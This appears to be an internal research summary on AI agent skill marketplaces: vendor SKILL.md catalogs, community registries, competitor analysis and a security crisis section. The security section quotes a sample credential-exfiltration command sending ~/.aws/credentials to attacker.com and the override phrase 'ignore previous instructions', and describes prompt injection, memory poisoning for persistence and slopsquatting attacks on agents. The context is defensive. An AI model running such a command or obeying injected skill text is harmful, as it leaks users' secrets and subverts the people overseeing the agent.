# AI Agent Skill Marketplaces — Unified Research Summary

*Deep research conducted 2026-03-16 across GitHub, Twitter/X, Reddit, ArXiv, and Kaggle*

---

## 1. Executive Summary

The agent skills marketplace has crossed from "emerging" to "explosive" in Q1 2026.
What was a niche concern of Cursor rule-sharers 6 months ago is now a full ecosystem
with vendor backing, academic study, security crises, and over a dozen competing
web marketplaces.

### Key numbers

| Metric | Value | Source |
|---|---|---|
| Total skills indexed (largest marketplace) | 400,000+ | SkillsMP |
| Skills analyzed for security (largest study) | 98,380 | ArXiv 2602.06547 |
| Skills with at least one vulnerability | 26.1% | ArXiv 2601.10338 |
| Skills with any security flaw (Snyk) | 36.82% (1,467/3,984) | Snyk ToxicSkills |
| Confirmed malicious skills | 157 (+ 76 confirmed by Snyk) | ArXiv + Snyk |
| ClawHavoc campaign: malicious skills infiltrated | ~1,200 | ArXiv 2602.20867 |
| Malicious tools catalogued (MalTool) | 6,487 | ArXiv 2603.00195 |
| OpenClaw instances worldwide | 63,026 | GitHub security report |
| Official vendor skill repos | 4 (Anthropic, OpenAI, Microsoft, Google) | GitHub |
| Web marketplaces | 12+ | DuckDuckGo search |
| ArXiv papers on agent skill security | 8+ | ArXiv search |
| GitHub "awesome" skill collections | 10+ | GitHub search |
| Agent platforms supporting SKILL.md | 20+ | Various sources |

### One-sentence takeaways

- **SKILL.md is the standard** — Anthropic created it, OpenAI adopted it, everyone indexes it.
- **Security is catastrophically bad** — 1 in 4 skills has a vulnerability, 1 in 8 has a critical one.
- **Marketplace saturation is real** — 12+ web marketplaces, 10+ GitHub collections, 4 vendor repos.
- **Quality beats quantity** — Academic evidence shows curated skills improve agent success while self-generated skills may degrade it.
- **Formal verification is emerging** — SkillFortify achieves 96.95% F1 with 0% false positives.

---

## 2. The Ecosystem Map

### 2.1 Official Vendor Skill Catalogs

| Vendor | Repo | Format | Install | Key Feature |
|---|---|---|---|---|
| **Anthropic** | anthropics/skills | SKILL.md | `/plugin marketplace add` | Document skills (docx/pdf/pptx/xlsx), partner skills |
| **OpenAI** | openai/skills | SKILL.md + agents/openai.yaml | `$skill-installer` | Progressive disclosure, implicit invocation, UI metadata |
| **Microsoft** | MicrosoftDocs/Agent-Skills | SKILL.md | Manual copy | Azure-specific, pre-compiled from Microsoft Learn docs |
| **Google** | google-labs-code/stitch-skills | SKILL.md | `npx skills add` | Stitch MCP server design skills |

**Key observation:** All 4 major vendors have converged on the SKILL.md format. Microsoft and Google are contributing skills for their own cloud platforms. The format war is over.

### 2.2 Major Community Registries

| Registry | Skills | Key Differentiator |
|---|---|---|
| **OpenClaw/ClawHub** | 13,729+ (Feb 2026) | Largest open registry, vector search, CLI tooling |
| **skills.sh** | Curated | Leaderboard by installs, trending, `npx skills add` |
| **Block/Goose Skills** | Growing | Block-maintained, web marketplace at block.github.io/goose/skills |

### 2.3 Web Marketplaces

| Platform | Skills | Agents | Differentiator |
|---|---|---|---|
| **SkillsMP** | 400,000+ | 3+ | Mass aggregation, largest by count |
| **SkillsGate** | 60,000+ | 17 | Security scanning via MCP, npx CLI |
| **SkillzWave** | 42,645+ | 22+ | ML quality scores, enterprise packages |
| **SkillHub** | 7,000+ | 9+ | 5-dimension AI evaluation, Skill Stacks, S/A/B ranking |
| **ReadTheSkill** | Growing | Multiple | Security + quality scoring, REST API, agent-native MCP discovery |
| **Agensi** | Growing | Multiple | Security vulnerability scanning |
| **cursor.directory** | 5,000+ | Cursor | Community + web browsing |
| **Cursor Marketplace** | 50+ plugins | Cursor | Official, IDE-integrated |
| **claude-plugins.dev** | Auto-indexed | Claude | Auto-indexes all public GitHub skills |
| **SpoonOS** | Growing | Web3 | First Web3 Skills Marketplace |
| **SafuSkill** | Growing | Web3 | BNB Chain, GoPlus security scanning |

### 2.4 GitHub Collections ("Awesome" Lists)

| Repo | Stars/Size | Focus |
|---|---|---|
| **VoltAgent/awesome-agent-skills** | 500+ skills | Official vendor + community, quality-curated |
| **tech-leads-club/agent-skills** | Security-validated | Snyk scanning, lockfiles, content hashing |
| **latestaiagents/agent-skills** | 67 skills + 7 plugins | Organized by audience (Safety, Dev, DevOps, RAG, Security) |
| **heilcheng/awesome-agent-skills** | Curated | Skills, tools, tutorials |
| **skillmatic-ai/awesome-agent-skills** | Definitive | Modular SKILL.md packages |
| **philipbankier/awesome-agent-skills** | Cross-platform | ALL agent skill ecosystems in one place |
| **agent-skills-hub/agent-skills-hub** | 790+ skills | Universal registry |
| **xiaoqiangkx/agent-skills-catalog** | Curated | Official skills from Anthropic, Vercel, Cloudflare, Stripe, HF, ToB |
| **dmgrok/agent_skills_directory** | Validated | LGTM validation, gitleaks, prompt injection checks |

### 2.5 Auto-Generation Projects

| Project | Method | Scale |
|---|---|---|
| **Arasoai/trending-skills** | GitHub Actions cron (every 15 min), Claude Sonnet generates SKILL.md from trending repos | Continuous |
| **VoltAgent/awesome-openclaw-skills** | Curated from ClawHub | 13,729 skills indexed |
| **FrancyJGLisboa/agent-skill-creator** | Turn any workflow into skills for 14+ tools | On-demand |

### 2.6 Security Tools & Research

| Tool/Paper | Type | Key Finding/Feature |
|---|---|---|
| **Snyk ToxicSkills** | Industry report | 36.82% of skills have security flaws, 76 confirmed malicious payloads |
| **ArXiv 2601.10338** (SkillScan) | Academic | 26.1% vulnerability rate, 42K skills analyzed |
| **ArXiv 2602.06547** | Academic | 157 confirmed malicious in 98K, single actor = 54.1% |
| **ArXiv 2603.00195** (SkillFortify) | Academic | Formal verification framework, 96.95% F1 |
| **ArXiv 2602.20867** (SoK) | Academic | ClawHavoc: 1,200 malicious skills, API keys/crypto wallets exfiltrated |
| **mcp-scan** (Snyk) | Tool | Multi-model + deterministic scanning for Agent Skills |
| **prompt-security/clawsec** | Tool | Security skill suite, SOUL.md drift detection |
| **Playbooks AI** | Tool | Pre-install security scanning for skill files |

---

## 3. The Security Crisis

### 3.1 Scale of the Problem

The agent skills ecosystem is experiencing a security crisis comparable to the early days
of npm and PyPI — but worse, because skills execute with full agent permissions.

| Attack Type | Prevalence | Example |
|---|---|---|
| **Data exfiltration** | 13.3% of all skills | `curl attacker.com/collect?data=$(cat ~/.aws/credentials)` |
| **Privilege escalation** | 11.8% | Modifying systemctl services, adding backdoors |
| **Prompt injection** | 9.7% | Base64 obfuscation, Unicode smuggling, "ignore previous instructions" |
| **Supply chain** | 8.5% | Unpinned dependencies, slopsquatting (hallucinated package names) |
| **Credential theft** | 10.9% (secrets in skills) | Hardcoded API keys, deliberate exfil infrastructure |
| **Third-party content injection** | 17.7% | Fetching untrusted content enabling indirect prompt injection |

### 3.2 Why Agent Skills Are Worse Than Package Ecosystems

From Snyk's ToxicSkills report:

| Traditional Packages (2015-2020) | Agent Skills (2026) |
|---|---|
| Typosquatting attacks | Observed |
| Malicious maintainers | Observed |
| Post-install scripts as attack vector | Skill "setup" instructions |
| **BUT:** | |
| Isolated execution context | **Full agent permissions** (shell, filesystem, env vars, email) |
| No analog | **Prompt injection** (natural language attacks evade code detection) |
| No analog | **Memory poisoning** (malicious skills modify SOUL.md/MEMORY.md for persistence) |

### 3.3 The ClawHavoc Campaign

The defining security event of early 2026:
- **~1,200 malicious skills** infiltrated the OpenClaw/ClawHub marketplace
- Exfiltrated: API keys, cryptocurrency wallets, browser credentials
- Multiple coordinated threat actors
- Triggered: VirusTotal scanning requirement, 12+ reactive security tools, 6+ ArXiv papers

### 3.4 Barrier to Entry for Attackers

From Snyk: "The barrier to publishing a new agent skill on ClawHub? A SKILL.md Markdown file and a GitHub account that's one week old. No code signing. No security review. No sandbox by default."

### 3.5 The "Slopsquatting" Attack

A novel attack vector unique to AI:
1. AI agents hallucinate plausible package names (e.g., `react-codeshift`)
2. These names get written into SKILL.md files across 237+ GitHub repos
3. Attacker registers the hallucinated package name
4. When agents execute `npx <hallucinated-name>`, they auto-install malware

---

## 4. Architectural Consensus

### 4.1 SKILL.md Format

All major vendors and marketplaces have converged on this structure:

```
my-skill/
├── SKILL.md            # Required: YAML frontmatter + instructions
├── scripts/            # Optional: executable code
├── references/         # Optional: documentation
├── templates/          # Optional: file templates
├── assets/             # Optional: images, resources
└── agents/
    └── openai.yaml     # Optional: UI metadata, invocation policy
```

Required frontmatter:
```yaml
---
name: skill-name
description: Clear description of when to trigger
---
```

### 4.2 Progressive Disclosure (Universal Principle)

Every vendor and every academic paper references this as the core design principle:

1. **Level 1 — Discovery:** Agent reads only `name` and `description` from frontmatter
2. **Level 2 — Instructions:** Agent loads full `SKILL.md` when task matches
3. **Level 3 — Resources:** Agent reads additional files (scripts, references) as needed

This keeps context windows lean while allowing unbounded skill complexity.

### 4.3 Agent Compatibility Matrix

| Agent | Skills Path | Status |
|---|---|---|
| Claude Code | `.claude/skills/` | Native support |
| Codex CLI | `.agents/skills/`, `~/.agents/skills/`, `/etc/codex/skills/` | Native support |
| Cursor | `.cursor/skills/` | Native support |
| Gemini CLI | `.gemini/skills/` | Native support |
| GitHub Copilot | `.github/skills/` | Native support |
| Antigravity IDE | `.agent/skills/` | Native support |
| Windsurf | `.windsurf/skills/` | Supported |
| OpenCode | `.agent/skills/` | Supported |
| Goose | Via skills CLI | Supported |
| Aider | Various | Supported |
| Cline | Various | Supported |
| Roo Code | Various | Supported |
| Amazon Q | Enterprise tier | Supported |
| Augment | Enterprise tier | Supported |

**20+ agents now support SKILL.md natively.**

---

## 5. Platform-by-Platform Findings

### 5.1 GitHub (richest source)

- **40+ repositories** found related to agent skill marketplaces
- **4 official vendor repos** (Anthropic, OpenAI, Microsoft, Google)
- **10+ "awesome" collections** competing for curation
- **Auto-generation** is emerging: Arasoai generates skills from trending repos every 15 minutes
- **Security tools** are a growth area: 5+ dedicated security repos
- **Enterprise skills** arriving: Microsoft Azure, Block/Square, Hashicorp Terraform, Stripe, Cloudflare

### 5.2 Twitter/X (signal layer)

- **Skills as the new app economy** — "$5-$100 per skill, comparable to early iOS App Store"
- **Self-improving agents** creating their own skills from successful runs
- **Web3/DeFi integration** — Pump.fun agent skills, Base onchain skills, SunSwap
- **"2 million+ agents read the skill.md"** (Moltbook) — agent-scale skill consumption
- **Skill Graphs > SKILL.md** — emerging critique that flat files need graph relationships

### 5.3 Reddit (community sentiment)

- **Marketplace fatigue** — too many "I built a marketplace" posts with decreasing engagement
- **Quality > quantity** — skepticism about 45K+ skill counts
- **Skills ≠ rules** — community consensus that skills are a meaningful evolution over .cursorrules
- **Security anxiety** — primary concern when evaluating any marketplace
- **Vendor trust** — skills from Anthropic/Vercel/Stripe trusted; random community skills are not

### 5.4 ArXiv (academic depth)

- **8 papers** found on agent skill security, architecture, and ecosystem
- **Security is the #1 research topic** — 6 of 8 papers directly address it
- **Formal verification emerging** — SkillFortify achieves near-perfect precision
- **Progressive disclosure formalized** as the core architectural principle
- **4-tier trust model proposed**: System → Curated → Community → Untrusted

### 5.5 Kaggle (educational validation)

- **Google/Kaggle 5-Day AI Agents Course** validates the agent+skills paradigm in education
- **19,000+ AI tools dataset** available for landscape analysis
- No dedicated agent skills datasets or competitions yet — this is an opportunity

---

## 6. Competitive Landscape for Our Marketplace

### 6.1 What We Have That Others Don't

| Capability | Us | SkillsGate | SkillsMP | VoltAgent | tech-leads-club |
|---|---|---|---|---|---|
| **Dual content types** (skills + rules) | Yes | No | No | No | No |
| **Cross-platform install scripts** with idempotency | Yes | Partial | No | No | Yes (CLI) |
| **104 automated tests** | Yes | No | No | No | No |
| **PEP 723 executable scripts** | Yes | No | No | No | No |
| **Collision detection** in installers | Yes | No | No | No | No |
| **Bloat warnings** (format-specific) | Yes | No | No | No | No |

### 6.2 What Others Have That We Don't

| Capability | Who Has It | Priority for Us |
|---|---|---|
| **agents/openai.yaml** support | OpenAI, tech-leads-club | HIGH — needed for Codex compatibility |
| **Security scanning** before install | SkillsGate, tech-leads-club, Playbooks AI | HIGH — table stakes now |
| **Web discovery** interface | Everyone except us | MEDIUM — our CLI-only approach limits discovery |
| **Progressive disclosure** in installer | OpenAI Codex natively | MEDIUM — our format supports it but installer doesn't leverage |
| **Auto-indexing** from GitHub | SkillsGate, claude-plugins.dev, Arasoai | LOW — we're curated, not aggregated |
| **MCP server** for agent-native discovery | tech-leads-club, ReadTheSkill | MEDIUM — enables agents to find skills programmatically |
| **Quality scoring** (AI evaluation) | SkillHub, SkillzWave, ReadTheSkill | LOW — we have tests instead |
| **Skill Stacks** (curated bundles) | SkillHub | LOW — nice-to-have |

### 6.3 Our Strategic Position

We occupy a **unique niche**: the only marketplace that combines skills AND rules in a single tested repository with cross-platform installers. This is a defensible position because:

1. **Rules are orthogonal to skills** — always-on context vs. on-demand capability. Nobody else formalizes this distinction.
2. **Tests are our moat** — 104 tests covering install safety, format compliance, idempotency, collision detection. Zero competitors test anything.
3. **PEP 723 scripts** give us executable skills with zero-install dependencies — more powerful than instruction-only SKILL.md files.
4. **Install script safety** (bloat warnings, collision detection, scope management) is unique.

---

## 7. Anthropic's Official Position (from blog post)

Key quotes from Anthropic's "Equipping agents for the real world with Agent Skills" (Oct 2025):

> "Building a skill for an agent is like putting together an onboarding guide for a new hire."

> "Instead of building fragmented, custom-designed agents for each use case, anyone can now specialize their agents with composable capabilities."

> "Agents with a filesystem and code execution tools don't need to read the entirety of a skill into their context window. This means that the amount of context that can be bundled into a skill is effectively unbounded."

> "We recommend installing skills only from trusted sources."

**Update (Dec 2025):** Published Agent Skills as an open standard for cross-platform portability at agentskills.io.

---

## 8. Snyk ToxicSkills Report (Industry Benchmark)

The most comprehensive industry security audit (Feb 5, 2026):

| Finding | Number |
|---|---|
| Skills scanned | 3,984 |
| Skills with CRITICAL issues | 534 (13.4%) |
| Skills with ANY security issue | 1,467 (36.82%) |
| Confirmed malicious payloads (HITL verified) | 76 |
| Still live on ClawHub at publication | 8 |

**Detection taxonomy (8 policies):**
1. Prompt injection detection (CRITICAL)
2. Malicious code detection (CRITICAL)
3. Suspicious download detection (CRITICAL)
4. Credential handling detection (HIGH)
5. Secret detection (HIGH)
6. Third-party content exposure (MEDIUM)
7. Unverifiable dependencies (MEDIUM)
8. Direct money access (MEDIUM)

**Key finding:** "100% of confirmed malicious skills contain malicious code patterns, while 91% simultaneously employ prompt injection techniques."

The combination of prompt injection + malicious code is uniquely dangerous: prompt injections prime the agent to accept malicious code that safety mechanisms would normally reject.

---

## 9. Recommended Actions (Priority Order)

### Immediate (This Week)

1. **Add `agents/openai.yaml` support** to our SKILL.md format spec — makes our skills installable via `$skill-installer` in Codex and discoverable in Codex app.

2. **Build a security scanning skill** — even basic checks (secret detection, suspicious URLs, prompt injection patterns) would differentiate us. Model it on Snyk's 8-policy taxonomy.

### Short-term (This Month)

3. **Add `.cursor/skills/` and `.agents/skills/` install targets** to our install scripts — our current install targets are for rules only. Skills need their own install paths.

4. **Document our security posture** — write a SECURITY.md explaining our `allowed-tools` restrictions, test suite, PEP 723 transparency, and review process. This is a selling point.

5. **Expand the catalog** — specifically target skills from vendor partners (Anthropic patterns, Vercel best practices, Cloudflare Workers). These are the skills developers trust and want.

### Medium-term (This Quarter)

6. **Consider an MCP server** — enable agents to discover and install our skills programmatically. tech-leads-club already has this.

7. **Consider web presence** — even a static GitHub Pages site listing our skills would improve discoverability vs. CLI-only.

8. **Skill Stacks** — curated bundles for common workflows (e.g., "Full-Stack Starter", "Security Hardening", "DevOps Essentials").

### Do NOT Do

- **Don't chase volume** — the 400K+ aggregators are full of noise and security risks
- **Don't auto-generate skills** — ArXiv evidence shows curated >> self-generated for agent success
- **Don't add Web3/crypto features** — premature, speculative, and our audience is developers not traders

---

## 10. Open Questions

1. **Should we adopt the `npx skills add` CLI?** — Block, tech-leads-club, and Google all use it. It's becoming the standard install mechanism. Compatibility matters.

2. **Should we register on skills.sh?** — Free exposure, trending leaderboard, `npx skills` compatibility. Low effort to list.

3. **How do we differentiate our "rules" concept?** — Nobody else formalizes always-on rules as a separate content type. This is unique but could be confusing if the market standardizes on "skills only."

4. **Should we adopt the Anthropic plugin marketplace protocol?** — `/plugin marketplace add` enables Claude Code users to install directly from our repo.

---

## Appendix: Source Index

### ArXiv Papers
| ID | Title | Date |
|---|---|---|
| 2601.10338 | Agent Skills in the Wild: Security Vulnerabilities at Scale | Jan 2026 |
| 2602.06547 | Malicious Agent Skills in the Wild | Feb 2026 |
| 2602.12430 | Agent Skills for LLMs: Architecture, Acquisition, Security | Feb 2026 |
| 2602.20867 | SoK: Agentic Skills — Beyond Tool Use | Feb 2026 |
| 2603.00195 | Formal Analysis and Supply Chain Security | Feb 2026 |
| 2603.13151 | Defensible Design for OpenClaw | Mar 2026 |
| 2603.11808 | Automating Skill Acquisition through Mining | Mar 2026 |
| 2508.03095 | AI Agent Registry Solutions Survey | Aug 2025 |

### Industry Reports
| Source | Title | Date |
|---|---|---|
| Snyk | ToxicSkills: Malicious AI Agent Skills | Feb 2026 |
| Anthropic Blog | Equipping agents with Agent Skills | Oct 2025 |
| OpenAI Dev Docs | Codex Skills Documentation | 2026 |
| AronHack | Agent Skills: Building Blocks for Smarter AI | Jan 2026 |
| CISO Marketplace | Agent Skills: The Next AI Attack Surface | 2026 |
| The Register | "It's easy to backdoor OpenClaw" | Feb 2026 |
| PCQuest | "AI agent skills are quietly becoming a major security risk" | 2026 |

### GitHub Repos (Key)
| Repo | Type |
|---|---|
| anthropics/skills | Official vendor |
| openai/skills | Official vendor |
| MicrosoftDocs/Agent-Skills | Official vendor |
| google-labs-code/stitch-skills | Official vendor |
| block/agent-skills | Corporate |
| openclaw/clawhub | Registry |
| VoltAgent/awesome-agent-skills | Curated collection |
| tech-leads-club/agent-skills | Security-validated registry |
| latestaiagents/agent-skills | Audience-organized |
| Arasoai/trending-skills | Auto-generated |
| aiskillstore/marketplace | Marketplace |
| prompt-security/clawsec | Security tool |

### Web Marketplaces
| URL | Name |
|---|---|
| skillsmp.com | SkillsMP |
| skillsgate.ai | SkillsGate |
| skillzwave.ai | SkillzWave |
| skillhub.club | SkillHub |
| skills.sh | Skills.sh |
| readtheskill.com | ReadTheSkill |
| agensi.io | Agensi |
| cursor.directory | Cursor Directory |
| cursor.com/marketplace | Cursor Marketplace |
| claude-plugins.dev | Claude Plugins |
| safuskill.ai | SafuSkill |
| block.github.io/goose/skills | Goose Skills |
